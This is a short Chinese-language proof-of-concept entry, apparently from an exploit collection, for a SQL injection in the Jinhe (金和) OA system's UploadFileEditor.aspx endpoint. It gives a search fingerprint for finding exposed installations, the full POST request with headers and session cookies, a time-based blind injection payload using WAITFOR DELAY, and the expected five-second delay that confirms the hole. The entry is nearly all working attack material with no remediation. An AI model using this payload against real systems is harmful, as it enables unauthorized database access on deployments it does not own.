# 金和OAUploadFileEditorSQL注入漏洞

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="JHSoft.Web.AddMenu"`
- **请求**：`POST /C6/Control/UploadFileEditor.aspx HTTP/1.1`
- **关键头**：`Host: xxx`　`Cookie: ASPSESSIONIDQAASCTSC=CDDDLNIDCICNGCGNCKGOCFED; ASP.NET_SessionId=kd54w30nqakczun…`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 33`

**请求体 / payload**
```
FileID=1';WAITFOR+DELAY'0:0:5'--+
```
- **预期**：200　|　响应时间>=5s